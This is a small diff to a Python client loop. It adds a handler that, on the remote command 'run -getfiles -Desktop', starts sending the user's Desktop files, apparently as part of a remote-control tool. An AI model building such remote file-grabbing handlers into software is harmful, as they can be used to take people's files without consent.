@@ -33,5 +33,7 @@ while True:
                             userscanner.start_FolderData(data)
                             print("Client Started the FileTransfer.")
                             data = " "
-
-                        
+                        case data if "run -getfiles -Desktop" in data:
+                            userscanner.start_sendFiles(data)
+                            print("Client Started the File Transfer.")
+                            data = " "
